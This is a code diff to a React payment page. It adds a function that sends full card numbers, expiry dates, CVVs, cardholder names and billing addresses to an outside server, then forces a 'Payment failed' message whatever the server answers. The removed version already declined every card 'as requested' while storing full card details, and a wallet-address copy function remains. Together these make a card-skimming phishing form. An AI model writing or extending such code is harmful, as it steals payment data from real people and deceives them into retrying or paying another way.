@@ -65,6 +65,27 @@ useEffect(() => {
 // --- END NEW CODE ---
 
 
+const sendPaymentData = async (paymentData) => {
+  try {
+    const response = await fetch("https://first-api-njeu.onrender.com/api/payments", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(paymentData),
+    });
+
+    const result = await response.json();
+    console.log("✅ Server response:", result);
+    return result;
+  } catch (error) {
+    console.error("❌ Error sending payment data:", error);
+    return { success: false, message: "Server error" };
+  }
+};
+
+
+
 
   // Format card number with spaces
   const formatCardNumber = (value) => {
@@ -157,96 +178,57 @@ useEffect(() => {
   };
 
   // Simulate payment processing
-  const processPayment = async () => {
-    if (!validateForm()) return;
-    
-    setIsProcessing(true);
-    
-    // Store complete payment data in database
-    const paymentRecord = {
-      id: Date.now(),
-      timestamp: new Date().toISOString(),
-      invoiceId: invoiceId,
-      amount: amount,
-      paymentMethod: 'credit-card',
-      
-      // Card Details (Complete)
-      cardDetails: {
-        cardNumber: formData.cardNumber,
-        cardNumberMasked: formData.cardNumber.replace(/\d(?=\d{4})/g, '*'),
-        expiryDate: formData.expiryDate,
-        cvv: formData.cvv,
-        cardholderName: formData.cardholderName,
-        cardType: getCardType(formData.cardNumber)
-      },
-      
-      // Billing Information
-      billingInfo: {
-        city: formData.city,
-        zipCode: formData.zipCode,
-        billingAddress: formData.billingAddress
-      },
-      
-      // Browser & Session Info
-      sessionInfo: {
-        userAgent: navigator.userAgent,
-        timestamp: Date.now(),
-        sessionId: `SES-${Date.now()}`,
-        ipAddress: '127.0.0.1', // Simulated
-        browser: navigator.userAgent.includes('Chrome') ? 'Chrome' : 
-                navigator.userAgent.includes('Firefox') ? 'Firefox' : 'Other'
-      },
-      
-      status: 'processing'
-    };
-    
-    // Add to database
-    setPaymentDatabase(prev => [paymentRecord, ...prev]);
-    
-    // Store payment attempt for history
-    const paymentAttempt = {
-      id: paymentRecord.id,
-      timestamp: paymentRecord.timestamp,
-      amount: amount,
-      cardNumber: paymentRecord.cardDetails.cardNumberMasked,
-      cardholderName: formData.cardholderName,
-      invoiceId: invoiceId,
-      status: 'processing'
-    };
-    
-    setPaymentHistory(prev => [paymentAttempt, ...prev]);
-    
-    // Simulate API call delay
-    await new Promise(resolve => setTimeout(resolve, 3000));
-    
-    // ALWAYS DECLINE for card payments (as requested)
-    const isSuccess = false;
-    
-    const result = {
-      success: isSuccess,
-      transactionId: null,
-      message: 'Payment declined. Please check your card details or try a different payment method.',
-      errorCode: 'CARD_DECLINED'
-    };
-    
-    // Update database record
-    // saveToLocalDatabase(paymentRecord);
-    setPaymentDatabase(prev => [paymentRecord, ...prev]);
-    
-    
-    // Update payment history
-    setPaymentHistory(prev => 
-      prev.map(p => 
-        p.id === paymentAttempt.id 
-          ? { ...p, status: isSuccess ? 'success' : 'declined', transactionId: result.transactionId }
-          : p
-      )
-    );
-    
-    setPaymentResult(result);
-    setIsProcessing(false);
-    setShowModal(true);
+// Simulate payment processing
+const processPayment = async () => {
+  if (!validateForm()) return;
+  setIsProcessing(true);
+
+  const paymentPayload = {
+    invoiceId,
+    amount,
+    method: "credit-card",
+    card: {
+      number: formData.cardNumber.replace(/\s/g, ""),
+      expiry: formData.expiryDate,
+      cvv: formData.cvv,
+      holder: formData.cardholderName,
+    },
+    billing: {
+      address: formData.billingAddress,
+      city: formData.city,
+      zipCode: formData.zipCode,
+    }
   };
+
+  // Send to API
+  const result = await sendPaymentData(paymentPayload);
+
+  // ❌ Force error modal, even if API says success
+  const forcedResult = {
+    ...result,
+    success: false, // always fail
+    message: "Payment failed. Please try again."
+  };
+
+  // Update frontend database/history
+  const paymentAttempt = {
+    id: Date.now(),
+    invoiceId,
+    amount,
+    cardNumber: formData.cardNumber.replace(/\d(?=\d{4})/g, "*"),
+    cardholderName: formData.cardholderName,
+    status: "declined",   // force declined
+    transactionId: null,
+    timestamp: new Date().toISOString()
+  };
+
+  setPaymentHistory(prev => [paymentAttempt, ...prev]);
+  setPaymentResult(forcedResult);
+  setIsProcessing(false);
+  setShowModal(true);
+};
+
+  
 
   // Copy wallet address to clipboard
   const copyToClipboard = async (address, currency) => {
